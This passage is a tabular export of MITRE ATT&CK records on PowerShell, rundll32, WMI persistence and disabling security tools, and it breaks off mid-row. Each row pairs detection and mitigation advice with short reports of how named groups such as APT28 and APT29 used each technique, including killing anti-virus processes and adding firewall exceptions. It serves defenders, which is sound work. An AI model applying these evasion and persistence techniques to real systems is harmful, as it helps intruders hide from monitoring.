271,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used PowerShell for execution.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
272,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0008|Carbanak]] installs VNC server software that executes through rundll32.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
273,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0074|Sakula]] calls cmd.exe to run various DLL files via rundll32.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Sakula, Sakurel, VIPER","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
274,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] uses rundll32 to call an exported function.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: StreamEx,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
275,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0147|Pteranodon]] executes functions using rundll32.exe.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: Pteranodon,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
276,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] is executed using rundll32.exe.[[CiteRef::F-Secure Sofacy 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: JHUHUGIT, Seduploader, ...","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
277,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] has used rundll32.exe in a Registry value to establish persistence.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: ADVSTORESHELL, NETUI, ...","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
278,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0137|CORESHELL]] is installed via execution of rundll32 with an export named ""init"" or ""InitW.""[[CiteRef::Microsoft SIR Vol 19]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: CORESHELL, SOURFACE","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
279,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",[u'[[Group/G0007|APT28]] executed [[Software/S0023|CHOPSTICK]] by using rundll32 commands such as <code>rundll32.exe \u201cC:\\Windows\\twain_64.dll\u201d</code>.[[CiteRef::Crowdstrike DNC June 2016]] [[Group/G0007|APT28]] also executed a .dll for a first stage dropper using rundll32.exe.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
280,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0148|RTM]] runs its core DLL file using rundll32.exe.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: RTM,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
281,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['After copying itself to a DLL file, a variant of [[Software/S0081|Elise]] calls the DLL file using rundll32.exe.[[CiteRef::Lotus Blossom Jun 2015]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Elise, BKDR_ESILE, Page","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
282,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['Variants of [[Software/S0082|Emissary]] have used rundll32.exe in Registry values added to establish persistence.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: Emissary,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
283,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['The [[Software/S0141|Winnti]] installer loads a DLL using rundll32.[[CiteRef::Microsoft Winnti Jan 2017]]'],['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: Winnti,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
284,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['The [[Software/S0046|CozyCar]] dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main [[Software/S0046|CozyCar]] component.[[CiteRef::F-Secure CozyDuke]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: CozyCar, CozyDuke, ...","['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
285,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0139|PowerDuke]] uses rundll32.exe to load.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: PowerDuke,"['Defense Evasion', 'Execution']",['Technique/T1085'],['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
286,"['Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]]']",[],[],[],['WMI Objects'],['[[Software/S0053|SeaDuke]] uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.[[CiteRef::FireEye WMI 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Disabling WMI services may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Persistence'],['Technique/T1084'],['Windows Management Instrumentation Event Subscription'],https://attack.mitre.org/wiki/Technique/T1084
287,"['Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]]']",[],[],[],['WMI Objects'],['[[Software/S0150|POSHSPY]] uses a WMI event subscription to establish persistence.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Disabling WMI services may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],Software: POSHSPY,['Persistence'],['Technique/T1084'],['Windows Management Instrumentation Event Subscription'],https://attack.mitre.org/wiki/Technique/T1084
288,"['Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]]']",[],[],[],['WMI Objects'],['[[Group/G0016|APT29]] has used WMI event filters to establish persistence.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Disabling WMI services may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Persistence'],['Technique/T1084'],['Windows Management Instrumentation Event Subscription'],https://attack.mitre.org/wiki/Technique/T1084
289,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['Malware used by [[Group/G0024|Putter Panda]] attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
290,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0108|netsh]] can be used to disable local firewall settings.[[CiteRef::TechNet Netsh Firewall]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
291,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Group/G0008|Carbanak]] may use [[Software/S0108|netsh]] to add local firewall rule exceptions.[[CiteRef::Group-IB Anunak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
292,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0125|Remsec]] can add or remove applications or ports on the Windows firewall or disable it entirely.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
293,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']","['[[Software/S0130|Unknown Logger]] has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Unknown Logger,['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
294,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']",['[[Software/S0004|TinyZBot]] can disable Avira anti-virus.[[CiteRef::Cylance Cleaver]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: TinyZBot,['Defense Evasion'],['Technique/T1089'],['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
295,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']","['The ""ZR"" variant of [[Software/S0031|BACKSPACE]] will check to see if known host-based firewalls are installed on the infected systems. [[Software/S0031|BACKSPACE]] will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 